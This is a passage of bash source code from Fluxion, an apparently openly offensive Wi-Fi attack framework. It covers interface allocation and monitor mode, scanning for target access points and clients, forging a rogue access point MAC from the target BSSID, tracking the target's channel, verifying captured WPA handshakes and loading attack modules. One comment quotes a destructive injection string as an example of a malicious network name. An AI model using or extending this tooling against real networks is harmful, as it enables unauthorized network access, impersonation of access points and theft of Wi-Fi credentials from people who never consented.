      echo -e "$FLUXIONVLine $FLUXIONGatheringWIInfoNotice"

      if ! interface_driver "$identifier"; then
        echo -e "$FLUXIONVLine$CRed $FLUXIONUnknownWIDriverError"
        sleep 3
        return 3
      fi

      # Notice: This local is function-scoped, not block-scoped.
      local -r driver="$InterfaceDriver"

      # Unload the driver module from the kernel.
      rmmod -f $driver &> $FLUXIONOutputDevice

      # Wait while interface becomes unavailable.
      echo -e "$FLUXIONVLine "$(
        io_dynamic_output $FLUXIONUnloadingWIDriverNotice
      )
      while interface_physical "$identifier"; do
        sleep 1
      done
    fi

    if [ "$FLUXIONWIKillProcesses" ]; then
      # Get list of potentially troublesome programs.
      echo -e "$FLUXIONVLine $FLUXIONFindingConflictingProcessesNotice"

      # Kill potentially troublesome programs.
      echo -e "$FLUXIONVLine $FLUXIONKillingConflictingProcessesNotice"

      # TODO: Make the loop below airmon-ng independent.
      # Maybe replace it with a list of network-managers?
      # WARNING: Version differences could break code below.
      for program in "$(airmon-ng check | awk 'NR>6{print $2}')"; do
        killall "$program" &> $FLUXIONOutputDevice
      done
    fi

    if [ "$FLUXIONWIReloadDriver" ]; then
      # Reload the driver module into the kernel.
      modprobe "$driver" &> $FLUXIONOutputDevice

      # Wait while interface becomes available.
      echo -e "$FLUXIONVLine "$(
        io_dynamic_output $FLUXIONLoadingWIDriverNotice
      )
      while ! interface_physical "$identifier"; do
        sleep 1
      done
    fi

    # Set wireless flag to prevent having to re-query.
    local -r allocatingWirelessInterface=1
  fi

  # If we're using the interface library, reidentify now.
  # If usuing airmon-ng, let airmon-ng rename the interface.
  if [ ! $FLUXIONAirmonNG ]; then
    echo -e "$FLUXIONVLine $FLUXIONReidentifyingInterface"

    # Prevent interface-snatching by renaming the interface.
    if [ $allocatingWirelessInterface ]; then
      # Get next wireless interface to add to FluxionInterfaces global.
      fluxion_next_assignable_interface fluxwl
    else
      # Get next ethernet interface to add to FluxionInterfaces global.
      fluxion_next_assignable_interface fluxet
    fi

    interface_reidentify $identifier $FluxionNextAssignableInterface

    if [ $? -ne 0 ]; then # If reidentifying failed, abort immediately.
      return 4
    fi
  fi

  if [ $allocatingWirelessInterface ]; then
    # Activate wireless interface monitor mode and save identifier.
    echo -e "$FLUXIONVLine $FLUXIONStartingWIMonitorNotice"

    # TODO: Consider the airmon-ng flag is set, monitor mode is
    # already enabled on the interface being allocated, and the
    # interface identifier is something non-airmon-ng standard.
    # The interface could already be in use by something else.
    # Snatching or crashing interface issues could occur.

    # NOTICE: Conditionals below populate newIdentifier on success.
    if [ $FLUXIONAirmonNG ]; then
      local -r newIdentifier=$(
        airmon-ng start $identifier |
        grep "monitor .* enabled" |
        grep -oP "wl[a-zA-Z0-9]+mon|mon[0-9]+|prism[0-9]+"
      )
    else
      # Attempt activating monitor mode on the interface.
      if interface_set_mode $FluxionNextAssignableInterface monitor; then
        # Register the new identifier upon consecutive successes.
        local -r newIdentifier=$FluxionNextAssignableInterface
      else
        # If monitor-mode switch fails, undo rename and abort.
        interface_reidentify $FluxionNextAssignableInterface $identifier
      fi
    fi
  fi

  # On failure to allocate the interface, we've got to abort.
  # Notice: If the interface was already in monitor mode and
  # airmon-ng is activated, WE didn't allocate the interface.
  if [ ! "$newIdentifier" -o "$newIdentifier" = "$oldIdentifier" ]; then
    echo -e "$FLUXIONVLine $FLUXIONInterfaceAllocationFailedError"
    sleep 3
    return 5
  fi

  # Register identifiers to allocation hash table.
  FluxionInterfaces[$newIdentifier]=$identifier
  FluxionInterfaces[$identifier]=$newIdentifier

  echo -e "$FLUXIONVLine $FLUXIONInterfaceAllocatedNotice"
  sleep 3

  # Notice: Interfaces are accessed with their original identifier
  # as the key for the global FluxionInterfaces hash/map/dictionary.
}

# Parameters: <interface_prefix>
# Description: Prints next available assignable interface name.
# ------------------------------------------------------------ #
fluxion_next_assignable_interface() {
  # Find next available interface by checking global.
  local -r prefix=$1
  local index=0
  while [ "${FluxionInterfaces[$prefix$index]}" ]; do
    let index++
  done
  FluxionNextAssignableInterface="$prefix$index"
}

# Parameters: <interfaces:lambda> [<query>]
# Note: The interfaces lambda must print an interface per line.
# ------------------------------------------------------------ #
# Return -1: Go back
# Return  1: Missing interfaces lambda identifier (not passed).
fluxion_get_interface() {
  if ! type -t "$1" &> /dev/null; then return 1; fi

  if [ "$2" ]; then
    local -r interfaceQuery="$2"
  else
    local -r interfaceQuery=$FLUXIONInterfaceQuery
  fi

  while true; do
    local candidateInterfaces
    readarray -t candidateInterfaces < <($1)
    local interfacesAvailable=()
    local interfacesAvailableInfo=()
    local interfacesAvailableColor=()
    local interfacesAvailableState=()

    # Gather information from all available interfaces.
    local candidateInterface
    for candidateInterface in "${candidateInterfaces[@]}"; do
      if [ ! "$candidateInterface" ]; then
        local skipOption=1
        continue
      fi

      interface_chipset "$candidateInterface"
      interfacesAvailableInfo+=("$InterfaceChipset")

      # If it has already been allocated, we can use it at will.
      local candidateInterfaceAlt=${FluxionInterfaces["$candidateInterface"]}
      if [ "$candidateInterfaceAlt" ]; then
        interfacesAvailable+=("$candidateInterfaceAlt")

        interfacesAvailableColor+=("$CGrn")
        interfacesAvailableState+=("[*]")
      else
        interfacesAvailable+=("$candidateInterface")

        interface_state "$candidateInterface"

        if [ "$InterfaceState" = "up" ]; then
          interfacesAvailableColor+=("$CPrp")
          interfacesAvailableState+=("[-]")
        else
          interfacesAvailableColor+=("$CClr")
          interfacesAvailableState+=("[+]")
        fi
      fi
    done

    # If only one interface exists and it's not unavailable, choose it.
    if [ "${#interfacesAvailable[@]}" -eq 1 -a \
      "${interfacesAvailableState[0]}" != "[-]" -a \
      "$skipOption" == "" ]; then FluxionInterfaceSelected="${interfacesAvailable[0]}"
      FluxionInterfaceSelectedState="${interfacesAvailableState[0]}"
      FluxionInterfaceSelectedInfo="${interfacesAvailableInfo[0]}"
      break
    else
      if [ $skipOption ]; then
        interfacesAvailable+=("$FLUXIONGeneralSkipOption")
        interfacesAvailableColor+=("$CClr")
      fi

      interfacesAvailable+=(
        "$FLUXIONGeneralRepeatOption"
        "$FLUXIONGeneralBackOption"
      )

      interfacesAvailableColor+=(
        "$CClr"
        "$CClr"
      )

      format_apply_autosize \
        "$CRed[$CSYel%1d$CClr$CRed]%b %-8b %3s$CClr %-*.*s\n"

      io_query_format_fields \
        "$FLUXIONVLine $interfaceQuery" "$FormatApplyAutosize" \
        interfacesAvailableColor[@] interfacesAvailable[@] \
        interfacesAvailableState[@] interfacesAvailableInfo[@]

      echo

      case "${IOQueryFormatFields[1]}" in
        "$FLUXIONGeneralSkipOption")
          FluxionInterfaceSelected=""
          FluxionInterfaceSelectedState=""
          FluxionInterfaceSelectedInfo=""
          return 0;;
        "$FLUXIONGeneralRepeatOption") continue;;
        "$FLUXIONGeneralBackOption") return -1;;
        *)
          FluxionInterfaceSelected="${IOQueryFormatFields[1]}"
          FluxionInterfaceSelectedState="${IOQueryFormatFields[2]}"
          FluxionInterfaceSelectedInfo="${IOQueryFormatFields[3]}"
          break;;
      esac
    fi
  done
}


# ============== < Fluxion Target Subroutines > ============== #
# Parameters: interface [ channel(s) [ band(s) ] ]
# ------------------------------------------------------------ #
# Return 1: Missing monitor interface.
# Return 2: Xterm failed to start airmon-ng.
# Return 3: Invalid capture file was generated.
# Return 4: No candidates were detected.
fluxion_target_get_candidates() {
  # Assure a valid wireless interface for scanning was given.
  if [ ! "$1" ] || ! interface_is_wireless "$1"; then return 1; fi

  echo -e "$FLUXIONVLine $FLUXIONStartingScannerNotice"
  echo -e "$FLUXIONVLine $FLUXIONStartingScannerTip"

  # Assure all previous scan results have been cleared.
  sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"

  #if [ "$FLUXIONAuto" ]; then
  #  sleep 30 && killall xterm &
  #fi

  # Begin scanner and output all results to "dump-01.csv."
if ! xterm -title "$FLUXIONScannerHeader" $TOPLEFTBIG \
    -bg "#000000" -fg "#FFFFFF" -e \
    "airodump-ng -Mat WPA "${2:+"--channel $2"}" "${3:+"--band $3"}" -w \"$FLUXIONWorkspacePath/dump\" $1" 2> $FLUXIONOutputDevice; then
    echo -e "$FLUXIONVLine$CRed $FLUXIONGeneralXTermFailureError"
    sleep 5
    return 2
fi

  # Sanity check the capture files generated by the scanner.
  # If the file doesn't exist, or if it's empty, abort immediately.
  if [ ! -f "$FLUXIONWorkspacePath/dump-01.csv" -o \
    ! -s "$FLUXIONWorkspacePath/dump-01.csv" ]; then
    sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"
    return 3
  fi

  # Syntheize scan opeFLUXIONWindowRation results from output file "dump-01.csv."
  echo -e "$FLUXIONVLine $FLUXIONPreparingScannerResultsNotice"
  # WARNING: The code below may break with different version of airmon-ng.
  # The times matching operator "{n}" isn't supported by mawk (alias awk).
  # readarray FLUXIONTargetCandidates < <(
  #   gawk -F, 'NF==15 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}'
  #   $FLUXIONWorkspacePath/dump-01.csv
  # )
  # readarray FLUXIONTargetCandidatesClients < <(
  #   gawk -F, 'NF==7 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}'
  #   $FLUXIONWorkspacePath/dump-01.csv
  # )
  local -r matchMAC="([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]"
  readarray FluxionTargetCandidates < <(
    awk -F, "NF==15 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
    "$FLUXIONWorkspacePath/dump-01.csv"
  )
  readarray FluxionTargetCandidatesClients < <(
    awk -F, "NF==7 && length(\$1)==17 && \$1~/$matchMAC/ {print \$0}" \
    "$FLUXIONWorkspacePath/dump-01.csv"
  )

  # Cleanup the workspace to prevent potential bugs/conflicts.
  sandbox_remove_workfile "$FLUXIONWorkspacePath/dump*"

  if [ ${#FluxionTargetCandidates[@]} -eq 0 ]; then
    echo -e "$FLUXIONVLine $FLUXIONScannerDetectedNothingNotice"
    sleep 3
    return 4
  fi
}


fluxion_get_target() {
  # Assure a valid wireless interface for scanning was given.
  if [ ! "$1" ] || ! interface_is_wireless "$1"; then return 1; fi

  local -r interface=$1

  local choices=( \
    "$FLUXIONScannerChannelOptionAll (2.4GHz)" \
    "$FLUXIONScannerChannelOptionAll (5GHz)" \
    "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)" \
    "$FLUXIONScannerChannelOptionSpecific" "$FLUXIONGeneralBackOption"
  )

  io_query_choice "$FLUXIONScannerChannelQuery" choices[@]

  echo

  case "$IOQueryChoice" in
    "$FLUXIONScannerChannelOptionAll (2.4GHz)")
      fluxion_target_get_candidates $interface "" "bg";;

    "$FLUXIONScannerChannelOptionAll (5GHz)")
      fluxion_target_get_candidates $interface "" "a";;

    "$FLUXIONScannerChannelOptionAll (2.4GHz & 5Ghz)")
      fluxion_target_get_candidates $interface "" "abg";;

    "$FLUXIONScannerChannelOptionSpecific")
      fluxion_header

      echo -e "$FLUXIONVLine $FLUXIONScannerChannelQuery"
      echo
      echo -e "     $FLUXIONScannerChannelSingleTip ${CBlu}6$CClr               "
      echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1-5$CClr             "
      echo -e "     $FLUXIONScannerChannelMiltipleTip ${CBlu}1,2,5-7,11$CClr      "
      echo
      echo -ne "$FLUXIONPrompt"

      local channels
      read channels

      echo

      fluxion_target_get_candidates $interface $channels;;

    "$FLUXIONGeneralBackOption")
      return -1;;
  esac

  # Abort if errors occured while searching for candidates.
  if [ $? -ne 0 ]; then return 2; fi

  local candidatesMAC=()
  local candidatesClientsCount=()
  local candidatesChannel=()
  local candidatesSecurity=()
  local candidatesSignal=()
  local candidatesPower=()
  local candidatesESSID=()
  local candidatesColor=()

  # Gather information from all the candidates detected.
  # TODO: Clean up this for loop using a cleaner algorithm.
  # Maybe try using array appending & [-1] for last elements.
  for candidateAPInfo in "${FluxionTargetCandidates[@]}"; do
    # Strip candidate info from any extraneous spaces after commas.
    candidateAPInfo=$(echo "$candidateAPInfo" | sed -r "s/,\s*/,/g")

    local i=${#candidatesMAC[@]}

    candidatesMAC[i]=$(echo "$candidateAPInfo" | cut -d , -f 1)
    candidatesClientsCount[i]=$(
      echo "${FluxionTargetCandidatesClients[@]}" |
      grep -c "${candidatesMAC[i]}"
    )
    candidatesChannel[i]=$(echo "$candidateAPInfo" | cut -d , -f 4)
    candidatesSecurity[i]=$(echo "$candidateAPInfo" | cut -d , -f 6)
    candidatesPower[i]=$(echo "$candidateAPInfo" | cut -d , -f 9)
    candidatesColor[i]=$(
      [ ${candidatesClientsCount[i]} -gt 0 ] && echo $CGrn || echo $CClr
    )

    # Parse any non-ascii characters by letting bash handle them.
    # Escape all single quotes in ESSID and let bash's $'...' handle it.
    local sanitizedESSID=$(
      echo "${candidateAPInfo//\'/\\\'}" | cut -d , -f 14
    )
    candidatesESSID[i]=$(eval "echo \$'$sanitizedESSID'")

    local power=${candidatesPower[i]}
    if [ $power -eq -1 ]; then
      # airodump-ng's man page says -1 means unsupported value.
      candidatesQuality[i]="??"
    elif [ $power -le $FLUXIONNoiseFloor ]; then
      candidatesQuality[i]=0
    elif [ $power -gt $FLUXIONNoiseCeiling ]; then
      candidatesQuality[i]=100
    else
      # Bash doesn't support floating point division, work around it...
      # Q = ((P - F) / (C - F)); Q-quality, P-power, F-floor, C-Ceiling.
      candidatesQuality[i]=$(( \
        (${candidatesPower[i]} * 10 - $FLUXIONNoiseFloor * 10) / \
        (($FLUXIONNoiseCeiling - $FLUXIONNoiseFloor) / 10) \
      ))
    fi
  done

  format_center_literals "WIFI LIST"
  local -r headerTitle="$FormatCenterLiterals\n\n"

  format_apply_autosize "$CRed[$CSYel ** $CClr$CRed]$CClr %-*.*s %4s %3s %3s %2s %-8.8s %18s\n"
  local -r headerFields=$(
    printf "$FormatApplyAutosize" \
      "ESSID" "QLTY" "PWR" "STA" "CH" "SECURITY" "BSSID"
  )

  format_apply_autosize "$CRed[$CSYel%03d$CClr$CRed]%b %-*.*s %3s%% %3s %3d %2s %-8.8s %18s\n"
  io_query_format_fields "$headerTitle$headerFields" \
   "$FormatApplyAutosize" \
    candidatesColor[@] \
    candidatesESSID[@] \
    candidatesQuality[@] \
    candidatesPower[@] \
    candidatesClientsCount[@] \
    candidatesChannel[@] \
    candidatesSecurity[@] \
    candidatesMAC[@]

  echo

  FluxionTargetMAC=${IOQueryFormatFields[7]}
  FluxionTargetSSID=${IOQueryFormatFields[1]}
  FluxionTargetChannel=${IOQueryFormatFields[5]}

  FluxionTargetEncryption=${IOQueryFormatFields[6]}

  FluxionTargetMakerID=${FluxionTargetMAC:0:8}
  FluxionTargetMaker=$(
    macchanger -l |
    grep ${FluxionTargetMakerID,,} 2> $FLUXIONOutputDevice |
    cut -d ' ' -f 5-
  )

  FluxionTargetSSIDClean=$(fluxion_target_normalize_SSID)

  # We'll change a single hex digit from the target AP's MAC address.
  # This new MAC address will be used as the rogue AP's MAC address.
  local -r rogueMACHex=$(printf %02X $((0x${FluxionTargetMAC:13:1} + 1)))
  FluxionTargetRogueMAC="${FluxionTargetMAC::13}${rogueMACHex:1:1}${FluxionTargetMAC:14:4}"
}

fluxion_target_normalize_SSID() {
  # Sanitize network ESSID to make it safe for manipulation.
  # Notice: Why remove these? Some smartass might decide to name their
  # network "; rm -rf / ;". If the string isn't sanitized accidentally
  # shit'll hit the fan and we'll have an extremly distressed user.
  # Replacing ' ', '/', '.', '~', '\' with '_'
  echo "$FluxionTargetSSID" | sed -r 's/( |\/|\.|\~|\\)+/_/g'
}

fluxion_target_show() {
  format_apply_autosize "%*s$CBlu%7s$CClr: %-32s%*s\n"

  local colorlessFormat="$FormatApplyAutosize"
  local colorfullFormat=$(
    echo "$colorlessFormat" | sed -r 's/%-32s/%-32b/g'
  )

  printf "$colorlessFormat" "" "ESSID" "\"${FluxionTargetSSID:-[N/A]}\" / ${FluxionTargetEncryption:-[N/A]}" ""
  printf "$colorlessFormat" "" "Channel" " ${FluxionTargetChannel:-[N/A]}" ""
  printf "$colorfullFormat" "" "BSSID" " ${FluxionTargetMAC:-[N/A]} ($CYel${FluxionTargetMaker:-[N/A]}$CClr)" ""

  echo
}

fluxion_target_tracker_daemon() {
  if [ ! "$1" ]; then return 1; fi # Assure we've got fluxion's PID.

  readonly fluxionPID=$1
  readonly monitorTimeout=10 # In seconds.
  readonly capturePath="$FLUXIONWorkspacePath/tracker_capture"

  if [ \
    -z "$FluxionTargetMAC" -o \
    -z "$FluxionTargetSSID" -o \
    -z "$FluxionTargetChannel" ]; then
    return 2 # If we're missing target information, we can't track properly.
  fi

  while true; do
    echo "[T-Tracker] Captor listening for $monitorTimeout seconds..."
    timeout --preserve-status $monitorTimeout airodump-ng -aw "$capturePath" \
      -d "$FluxionTargetMAC" $FluxionTargetTrackerInterface &> /dev/null
    local error=$? # Catch the returned status error code.

    if [ $error -ne 0 ]; then # If any error was encountered, abort!
      echo -e "[T-Tracker] ${CRed}Error:$CClr Operation aborted (code: $error)!"
      break
    fi

    local targetInfo=$(head -n 3 "$capturePath-01.csv" | tail -n 1)
    sandbox_remove_workfile "$capturePath-*"

    local targetChannel=$(
      echo "$targetInfo" | awk -F, '{gsub(/ /, "", $4); print $4}'
    )

    echo "[T-Tracker] $targetInfo"

    if [ "$targetChannel" -ne "$FluxionTargetChannel" ]; then
      echo "[T-Tracker] Target channel change detected!"
      FluxionTargetChannel=$targetChannel
      break
    fi

    # NOTE: We might also want to check for SSID changes here, assuming the only
    # thing that remains constant is the MAC address. The problem with that is
    # that airodump-ng has some serious problems with unicode, apparently.
    # Try feeding it an access point with Chinese characters and check the .csv.
  done

  # Save/overwrite the new target information to the workspace for retrival.
  echo "$FluxionTargetMAC" > "$FLUXIONWorkspacePath/target_info.txt"
  echo "$FluxionTargetSSID" >> "$FLUXIONWorkspacePath/target_info.txt"
  echo "$FluxionTargetChannel" >> "$FLUXIONWorkspacePath/target_info.txt"

  # NOTICE: Using different signals for different things is a BAD idea.
  # We should use a single signal, SIGINT, to handle different situations.
  kill -s SIGALRM $fluxionPID # Signal fluxion a change was detected.

  sandbox_remove_workfile "$capturePath-*"
}

fluxion_target_tracker_stop() {
  if [ ! "$FluxionTargetTrackerDaemonPID" ]; then return 1; fi
  kill -s SIGABRT $FluxionTargetTrackerDaemonPID &> /dev/null
  FluxionTargetTrackerDaemonPID=""
}

fluxion_target_tracker_start() {
  if [ ! "$FluxionTargetTrackerInterface" ]; then return 1; fi

  fluxion_target_tracker_daemon $$ &> "$FLUXIONOutputDevice" &
  FluxionTargetTrackerDaemonPID=$!
}

fluxion_target_unset_tracker() {
  if [ ! "$FluxionTargetTrackerInterface" ]; then return 1; fi

  FluxionTargetTrackerInterface=""
}

fluxion_target_set_tracker() {
  if [ "$FluxionTargetTrackerInterface" ]; then
    echo "Tracker interface already set, skipping." > $FLUXIONOutputDevice
    return 0
  fi

  # Check if attack provides tracking interfaces, get & set one.
  if ! type -t attack_tracking_interfaces &> /dev/null; then
    echo "Tracker DOES NOT have interfaces available!" > $FLUXIONOutputDevice
    return 1
  fi

  if [ "$FluxionTargetTrackerInterface" == "" ]; then
    echo "Running get interface (tracker)." > $FLUXIONOutputDevice
    local -r interfaceQuery=$FLUXIONTargetTrackerInterfaceQuery
    local -r interfaceQueryTip=$FLUXIONTargetTrackerInterfaceQueryTip
    local -r interfaceQueryTip2=$FLUXIONTargetTrackerInterfaceQueryTip2
    if ! fluxion_get_interface attack_tracking_interfaces \
      "$interfaceQuery\n$FLUXIONVLine $interfaceQueryTip\n$FLUXIONVLine $interfaceQueryTip2"; then
      echo "Failed to get tracker interface!" > $FLUXIONOutputDevice
      return 2
    fi
    local selectedInterface=$FluxionInterfaceSelected
  else
    # Assume user passed one via the command line and move on.
    # If none was given we'll take care of that case below.
    local selectedInterface=$FluxionTargetTrackerInterface
    echo "Tracker interface passed via command line!" > $FLUXIONOutputDevice
  fi

  # If user skipped a tracker interface, move on.
  if [ ! "$selectedInterface" ]; then
    fluxion_target_unset_tracker
    return 0
  fi

  if ! fluxion_allocate_interface $selectedInterface; then
    echo "Failed to allocate tracking interface!" > $FLUXIONOutputDevice
    return 3
  fi

  echo "Successfully got tracker interface." > $FLUXIONOutputDevice
  FluxionTargetTrackerInterface=${FluxionInterfaces[$selectedInterface]}
}

fluxion_target_unset() {
  FluxionTargetMAC=""
  FluxionTargetSSID=""
  FluxionTargetChannel=""

  FluxionTargetEncryption=""

  FluxionTargetMakerID=""
  FluxionTargetMaker=""

  FluxionTargetSSIDClean=""

  FluxionTargetRogueMAC=""

  return 1 # To trigger undo-chain.
}

fluxion_target_set() {
  # Check if attack is targetted & set the attack target if so.
  if ! type -t attack_targetting_interfaces &> /dev/null; then
    return 1
  fi

  if [ \
    "$FluxionTargetSSID" -a \
    "$FluxionTargetMAC" -a \
    "$FluxionTargetChannel" \
  ]; then
    # If we've got a candidate target, ask user if we'll keep targetting it.

    fluxion_header
    fluxion_target_show
    echo
    echo -e  "$FLUXIONVLine $FLUXIONTargettingAccessPointAboveNotice"

    # TODO: This doesn't translate choices to the selected language.
    while ! echo "$choice" | grep -q "^[ynYN]$" &> /dev/null; do
      echo -ne "$FLUXIONVLine $FLUXIONContinueWithTargetQuery [Y/n] "
      local choice
      read choice
      if [ ! "$choice" ]; then break; fi
    done

    echo -ne "\n\n"

    if [ "${choice,,}" != "n" ]; then
      return 0
    fi
  elif [ \
    "$FluxionTargetSSID" -o \
    "$FluxionTargetMAC" -o \
    "$FluxionTargetChannel" \
  ]; then
    # TODO: Survey environment here to autofill missing fields.
    # In other words, if a user gives incomplete information, scan
    # the environment based on either the ESSID or BSSID, & autofill.
    echo -e "$FLUXIONVLine $FLUXIONIncompleteTargettingInfoNotice"
    sleep 3
  fi

  if ! fluxion_get_interface attack_targetting_interfaces \
    "$FLUXIONTargetSearchingInterfaceQuery"; then
    return 2
  fi

  if ! fluxion_allocate_interface $FluxionInterfaceSelected; then
    return 3
  fi

  if ! fluxion_get_target \
    ${FluxionInterfaces[$FluxionInterfaceSelected]}; then
    return 4
  fi
}


# =================== < Hash Subroutines > =================== #
# Parameters: <hash path> <bssid> <essid> [channel [encryption [maker]]]
fluxion_hash_verify() {
  if [ ${#@} -lt 3 ]; then return 1; fi

  local -r hashPath=$1
  local -r hashBSSID=$2
  local -r hashESSID=$3
  local -r hashChannel=$4
  local -r hashEncryption=$5
  local -r hashMaker=$6

  if [ ! -f "$hashPath" -o ! -s "$hashPath" ]; then
    echo -e "$FLUXIONVLine $FLUXIONHashFileDoesNotExistError"
    sleep 3
    return 2
  fi

  if [ "$FLUXIONAuto" ]; then
    local -r verifier="cowpatty"
  else
    fluxion_header

    echo -e "$FLUXIONVLine $FLUXIONHashVerificationMethodQuery"
    echo

    fluxion_target_show

    local choices=( \
      "$FLUXIONHashVerificationMethodAircrackOption" \
      "$FLUXIONHashVerificationMethodCowpattyOption" \
    )

    # Add pyrit to the options is available.
    if [ -x "$(command -v pyrit)" ]; then
      choices+=("$FLUXIONHashVerificationMethodPyritOption")
    fi

    options+=("$FLUXIONGeneralBackOption")

    io_query_choice "" choices[@]

    echo

    case "$IOQueryChoice" in
      "$FLUXIONHashVerificationMethodPyritOption")
        local -r verifier="pyrit" ;;

      "$FLUXIONHashVerificationMethodAircrackOption")
        local -r verifier="aircrack-ng" ;;

      "$FLUXIONHashVerificationMethodCowpattyOption")
        local -r verifier="cowpatty" ;;

      "$FLUXIONGeneralBackOption")
        return -1 ;;
    esac
  fi

  hash_check_handshake \
    "$verifier" \
    "$hashPath" \
    "$hashESSID" \
    "$hashBSSID"

  local -r hashResult=$?

  # A value other than 0 means there's an issue with the hash.
  if [ $hashResult -ne 0 ]; then
    echo -e "$FLUXIONVLine $FLUXIONHashInvalidError"
  else
    echo -e "$FLUXIONVLine $FLUXIONHashValidNotice"
  fi

  sleep 3

  if [ $hashResult -ne 0 ]; then return 1; fi
}

fluxion_hash_unset_path() {
  if [ ! "$FluxionHashPath" ]; then return 1; fi
  FluxionHashPath=""

  # Since we're auto-selecting when on auto, trigger undo-chain.
  if [ "$FLUXIONAuto" ]; then return 2; fi
}

# Parameters: <hash path> <bssid> <essid> [channel [encryption [maker]]]
fluxion_hash_set_path() {
  if [ "$FluxionHashPath" ]; then return 0; fi

  fluxion_hash_unset_path

  local -r hashPath=$1

  # If we've got a default path, check if a hash exists.
  # If one exists, ask users if they'd like to use it.
  if [ "$hashPath" -a -f "$hashPath" -a -s "$hashPath" ]; then
    if [ "$FLUXIONAuto" ]; then
      echo "Using default hash path: $hashPath" > $FLUXIONOutputDevice
      FluxionHashPath=$hashPath
      return
    else
      local choices=( \
        "$FLUXIONUseFoundHashOption" \
        "$FLUXIONSpecifyHashPathOption" \
        "$FLUXIONHashSourceRescanOption" \
        "$FLUXIONGeneralBackOption" \
      )

      fluxion_header

      echo -e "$FLUXIONVLine $FLUXIONFoundHashNotice"
      echo -e "$FLUXIONVLine $FLUXIONUseFoundHashQuery"
      echo

      io_query_choice "" choices[@]

      echo

      case "$IOQueryChoice" in
        "$FLUXIONUseFoundHashOption")
          FluxionHashPath=$hashPath
          return ;;

        "$FLUXIONHashSourceRescanOption")
          fluxion_hash_set_path "$@"
          return $? ;;

        "$FLUXIONGeneralBackOption")
          return -1 ;;
      esac
    fi
  fi

  while [ ! "$FluxionHashPath" ]; do
    fluxion_header

    echo
    echo -e "$FLUXIONVLine $FLUXIONPathToHandshakeFileQuery"
    echo -e "$FLUXIONVLine $FLUXIONPathToHandshakeFileReturnTip"
    echo
    echo -ne "$FLUXIONAbsolutePathInfo: "
    read FluxionHashPath

    # Back-track when the user leaves the hash path blank.
    # Notice: Path is cleared if we return, no need to unset.
    if [ ! "$FluxionHashPath" ]; then return 1; fi

    echo "Path given: \"$FluxionHashPath\"" > $FLUXIONOutputDevice

    # Make sure the path points to a valid generic file.
    if [ ! -f "$FluxionHashPath" -o ! -s "$FluxionHashPath" ]; then
      echo -e "$FLUXIONVLine $FLUXIONEmptyOrNonExistentHashError"
      sleep 5
      fluxion_hash_unset_path
    fi
  done
}

# Paramters: <defaultHashPath> <bssid> <essid>
fluxion_hash_get_path() {
  # Assure we've got the bssid and the essid passed in.
  if [ ${#@} -lt 2 ]; then return 1; fi

  while true; do
    fluxion_hash_unset_path
    if ! fluxion_hash_set_path "$@"; then
      echo "Failed to set hash path." > $FLUXIONOutputDevice
      return -1 # WARNING: The recent error code is NOT contained in $? here!
    else
      echo "Hash path: \"$FluxionHashPath\"" > $FLUXIONOutputDevice
    fi

    if fluxion_hash_verify "$FluxionHashPath" "$2" "$3"; then
      break;
    fi
  done

  # At this point FluxionHashPath will be set and ready.
}


# ================== < Attack Subroutines > ================== #
fluxion_unset_attack() {
  local -r attackWasSet=${FluxionAttack:+1}
  FluxionAttack=""
  if [ ! "$attackWasSet" ]; then return 1; fi
}

fluxion_set_attack() {
  if [ "$FluxionAttack" ]; then return 0; fi

  fluxion_unset_attack

  fluxion_header

  echo -e "$FLUXIONVLine $FLUXIONAttackQuery"
  echo

  fluxion_target_show

  local attacks
  readarray -t attacks < <(ls -1 "$FLUXIONPath/attacks")

  local descriptions
  readarray -t descriptions < <(
    head -n 3 "$FLUXIONPath/attacks/"*"/language/$FluxionLanguage.sh" | \
    grep -E "^# description: " | sed -E 's/# \w+: //'
  )

  local identifiers=()

  local attack
  for attack in "${attacks[@]}"; do
    local identifier=$(
      head -n 3 "$FLUXIONPath/attacks/$attack/language/$FluxionLanguage.sh" | \
      grep -E "^# identifier: " | sed -E 's/# \w+: //'
    )
    if [ "$identifier" ]; then
      identifiers+=("$identifier")
    else
      identifiers+=("$attack")
    fi
  done

  attacks+=("$FLUXIONGeneralBackOption")
  identifiers+=("$FLUXIONGeneralBackOption")
  descriptions+=("")

  io_query_format_fields "" \
    "\t$CRed[$CSYel%d$CClr$CRed]$CClr%0.0s $CCyn%b$CClr %b\n" \
    attacks[@] identifiers[@] descriptions[@]

  echo

  if [ "${IOQueryFormatFields[1]}" = "$FLUXIONGeneralBackOption" ]; then
    return -1
  fi

  if [ "${IOQueryFormatFields[1]}" = "$FLUXIONAttackRestartOption" ]; then
    return 2
  fi


  FluxionAttack=${IOQueryFormatFields[0]}
}

fluxion_unprep_attack() {
  if type -t unprep_attack &> /dev/null; then
    unprep_attack
  fi

  IOUtilsHeader="fluxion_header"

  # Remove any lingering targetting subroutines loaded.
  unset attack_targetting_interfaces
  unset attack_tracking_interfaces

  # Remove any lingering restoration subroutines loaded.
  unset load_attack
  unset save_attack

  FluxionTargetTrackerInterface=""

  return 1 # Trigger another undo since prep isn't significant.
}

fluxion_prep_attack() {
  local -r path="$FLUXIONPath/attacks/$FluxionAttack"

  if [ ! -x "$path/attack.sh" ]; then return 1; fi
  if [ ! -x "$path/language/$FluxionLanguage.sh" ]; then return 2; fi

  # Load attack parameters if any exist.
  if [ "$AttackCLIArguments" ]; then
    eval set -- "$AttackCLIArguments"
    # Remove them after loading them once.
    unset AttackCLIArguments
  fi

  # Load attack and its corresponding language file.
  # Load english by default to overwrite globals that ARE defined.
  source "$path/language/en.sh"
  if [ "$FluxionLanguage" != "en" ]; then
    source "$path/language/$FluxionLanguage.sh"
  fi
  source "$path/attack.sh"

  # Check if attack is targetted & set the attack target if so.
  if type -t attack_targetting_interfaces &> /dev/null; then
    if ! fluxion_target_set; then return 3; fi
  fi

  # Check if attack provides tracking interfaces, get & set one.
  # TODO: Uncomment the lines below after implementation.
  if type -t attack_tracking_interfaces &> /dev/null; then
    if ! fluxion_target_set_tracker; then return 4; fi
  fi

  # If attack is capable of restoration, check for configuration.
  if type -t load_attack &> /dev/null; then
    # If configuration file available, check if user wants to restore.
    if [ -f "$path/attack.conf" ]; then
      local choices=( \
